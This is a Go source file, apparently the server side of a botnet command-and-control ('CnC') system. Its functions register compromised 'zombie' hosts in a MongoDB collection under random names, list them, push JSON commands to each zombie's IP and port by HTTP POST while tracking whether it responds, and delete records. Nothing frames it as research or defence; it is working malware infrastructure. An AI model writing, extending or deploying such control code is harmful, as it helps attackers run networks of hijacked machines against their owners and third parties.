package api

import (
	errmanager "CnC/service/api/ErrManager"
	"bytes"
	"context"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"strconv"
	"time"

	"github.com/goombaio/namegenerator"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo/options"
)

func (rt *_router) createNewZombie(zombie Zombie) (string, errmanager.Errors) {
	var z Zombie
	filter := bson.D{{Key: "id", Value: zombie.Id}}
	update := bson.D{{Key: "$set", Value: bson.M{"ip": zombie.Ip, "ports": zombie.Ports}}}
	errr := rt.db.Collection(0).FindOneAndUpdate(context.TODO(), filter, update).Decode(&z)
	if errr == nil {
		return z.CustomUsername, nil
	}
	seed := time.Now().UTC().UnixNano()
	nameGenerator := namegenerator.NewNameGenerator(seed)
	name := nameGenerator.Generate()
	newZombie := Zombie{
		Ip:             zombie.Ip,
		Id:             zombie.Id,
		Active:         true,
		Ports:          zombie.Ports,
		CustomUsername: name,
	}
	_, errr = rt.db.Collection(0).InsertOne(context.TODO(), newZombie)
	if errr != nil {
		return "", errmanager.NewError("Can't Create Zombie", StatusInternalServerError)
	}
	return newZombie.CustomUsername, nil
}

func (rt *_router) getZombies() ([]Zombie, errmanager.Errors) {
	var zombies []Zombie
	filter := bson.D{{}}
	findOptions := options.Find()
	cursor, errr := rt.db.Collection(0).Find(context.TODO(), filter, findOptions)
	if errr != nil {
		return zombies, errmanager.NewError("Cannot Get Zombies", StatusInternalServerError)
	}
	for cursor.Next(context.TODO()) {
		var zombie Zombie
		errr = cursor.Decode(&zombie)
		if errr != nil {
			return zombies, errmanager.NewError("Cannot Get Zombie", StatusInternalServerError)
		}
		zombies = append(zombies, zombie)
	}

	return zombies, nil
}

func (rt *_router) zombieAction(action Action) (map[string]interface{}, errmanager.Errors) {
	var z Zombie
	filter := bson.D{{Key: "id", Value: action.Id}}
	errr := rt.db.Collection(0).FindOne(context.TODO(), filter).Decode(&z)
	if errr != nil {
		return nil, errmanager.NewError("Cannot Get Zombie", StatusInternalServerError)
	}
	url := "http://" + z.Ip + ":" + strconv.FormatInt(int64(z.Ports[0]), 10)
	Println(url)
	body, _ := json.Marshal(action)
	r, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		filter = bson.D{{Key: "id", Value: action.Id}}
		update := bson.M{"$set": bson.M{"active": false}}
		_, errr = rt.db.Collection(0).UpdateOne(context.TODO(), filter, update)
		if errr != nil {
			return nil, errmanager.NewError("Cannot Get Zombie", StatusInternalServerError)
		}
		return nil, errmanager.NewError("Cannot Connect to Zombie", StatusInternalServerError)
	}
	r.Header.Add("Content-Type", "application/json")
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		filter = bson.D{{Key: "id", Value: action.Id}}
		update := bson.M{"$set": bson.M{"active": false}}
		_, errr = rt.db.Collection(0).UpdateOne(context.TODO(), filter, update)
		if errr != nil {
			return nil, errmanager.NewError("Cannot Get Zombie", StatusInternalServerError)
		}
		return nil, errmanager.NewError("Cannot Read Response", StatusInternalServerError)
	}
	body, err = ioutil.ReadAll(res.Body)
	if err != nil {
		filter = bson.D{{Key: "id", Value: action.Id}}
		update := bson.M{"$set": bson.M{"active": false}}
		_, errr = rt.db.Collection(0).UpdateOne(context.TODO(), filter, update)
		if errr != nil {
			return nil, errmanager.NewError("Cannot Get Zombie", StatusInternalServerError)
		}
		return nil, errmanager.NewError(err.Error(), StatusInternalServerError)
	}
	var intf map[string]interface{}
	if err := json.Unmarshal([]byte(body), &intf); err != nil {
		return nil, errmanager.NewError(err.Error(), StatusBadRequest)
	}
	intf["id"] = action.Id
	filter = bson.D{{Key: "id", Value: action.Id}}
	update := bson.M{"$set": bson.M{"active": true}}
	_, errr = rt.db.Collection(0).UpdateOne(context.TODO(), filter, update)
	if errr != nil {
		return nil, errmanager.NewError(err.Error(), StatusInternalServerError)
	}
	return intf, nil
}

func (rt *_router) zombieDelete(id string) errmanager.Errors {
	filter := bson.D{{Key: "id", Value: id}}
	_, err := rt.db.Collection(0).DeleteOne(context.TODO(), filter)
	if err != nil {
		return errmanager.NewError("Cannot Get Zombie", StatusInternalServerError)
	}
	return nil
}
